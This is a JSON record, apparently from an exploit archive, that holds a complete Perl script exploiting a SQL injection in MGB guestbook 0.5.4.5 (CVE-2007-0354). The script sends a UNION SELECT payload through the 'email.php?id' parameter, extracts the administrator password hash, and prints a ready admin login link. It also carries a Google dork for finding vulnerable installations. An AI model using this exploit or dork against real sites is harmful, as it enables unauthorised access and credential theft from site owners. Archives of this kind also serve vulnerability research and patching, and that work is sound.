{
  "id": "3141",
  "title": "MGB 0.5.4.5 - &#039;email.php?id&#039; SQL Injection",
  "cve": "CVE-2007-0354",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n#\r\n##########################################################\r\n# MGB <= 0.5.4.5 Exploit\r\n# Vulnerability found by SlimTim10\r\n# Created By: SlimTim10\r\n# <slimtim10@gmail.com>\r\n##########################################################\r\n# Google dork:\r\n# ( intext:mgb.0.5.. & intext:mopzz ) | intext:mgb.0.5.4..\r\n##########################################################\r\n\r\n\r\nuse IO::Socket::INET;\r\n\r\nusage() unless (@ARGV == 2);\r\n\r\n$host = $ARGV[0];\r\n$dir = $ARGV[1];\r\n\r\n$dir = \"\\/$dir\" if ($dir !~ /^\\//);\r\n$dir = \"$dir\\/\" if ($dir !~ /\\/$/);\r\n$host =~ s/http:\\/\\///g;\r\n\r\n$path = $dir.'email.php?id=1%20UNION%20SELECT%20null,passwort%20FROM%20mgb_settings%20--';\r\n$socket = IO::Socket::INET->new( Proto => \"tcp\",\r\n\t\t\t\t\t\t\t\t PeerAddr => \"$host\",\r\n\t\t\t\t\t\t\t\t PeerPort => \"80\")\r\n\t\t\t\t\t\t\t\t || die \"[-]Connect Failed: could not connect to $host\\n\";\r\n\r\nprint \"[+]Connecting...\\n\";\r\nprint $socket \"GET $path HTTP/1.1\\n\";\r\nprint $socket \"Host: $host\\n\";\r\nprint $socket \"Accept: */*\\n\";\r\nprint $socket \"Connection: close\\n\\n\";\r\nprint \"[+]Connected!\\n\";\r\n\r\nwhile ($answer = <$socket>) {\r\n  $answer =~ m/Email an&nbsp;(.*?)&nbsp;schreiben/ and $var = $1;\r\n}\r\n\r\nif ($var !~ /[\\da-f]{32,32}/) {\r\n\tprint \"[-]Exploit failed.\";\r\n\texit(0);\r\n}\r\n\r\nprint \"[+]Admin Password: $var\\n\";\r\nprint \"[+]Admin Link: http://$host\".$dir.\"admin.php?sid=$var\\n\";\r\n\r\nsub usage {\r\n    print \"\\n\" . \"=|=-\" x 14 . \"=|=\";\r\n    print q(\r\n]                                                         [\r\n[       MGB <= 0.5.4.5 Remote SQL Injection Exploit       ]\r\n[                Tested on MGB <= 0.5.4.5                 ]\r\n[       Created by: SlimTim10 <slimtim10@gmail.com>       ]\r\n]                                                         [\r\n);\r\n    print \"=|=-\" x 14 . \"=|=\\n\\n\";\r\n    print \"\\tUsage: $0 [HOST] [PATH]\\n\";\r\n    print \"\\tEx: $0 www.host.com /guestbook/\\n\";\r\n    print \"\\tEx: $0 host.com mgb\";\r\n    print \"\\n\\n\".\"`^\" x 29 . \"`\\n\";\r\n    exit(0);\r\n}\r\n\r\n# milw0rm.com [2007-01-17]",
  "url": "https://www.exploit-db.com/exploits/3141"
}